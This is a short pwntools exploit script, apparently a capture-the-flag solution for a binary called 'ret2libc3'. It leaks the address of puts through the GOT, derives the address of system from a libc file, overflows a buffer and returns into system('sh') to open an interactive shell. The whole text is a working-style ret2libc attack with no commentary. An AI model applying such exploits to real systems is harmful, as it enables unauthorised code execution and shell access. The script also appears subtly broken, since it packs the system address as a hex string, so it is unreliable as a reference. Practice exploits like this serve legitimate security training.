from pwn import *

file="./ret2libc3"
io=process(file)
io.recv()

elf=ELF(file)
io.sendline(str(elf.got["puts"]))
io.recvuntil(b": ")
puts=int(io.recvuntil(b"\n",drop=True),16)

success("puts:{:#x}".format(puts))
libc=ELF("./libc.so")
system=hex(puts + (libc.symbols["system"]-libc.symbols["puts"]))

payload=flat(cyclic(60),system,0xdeadbeef,next(elf.search(b"sh\x00")))

io.recv()
io.sendline(payload)
io.interactive()
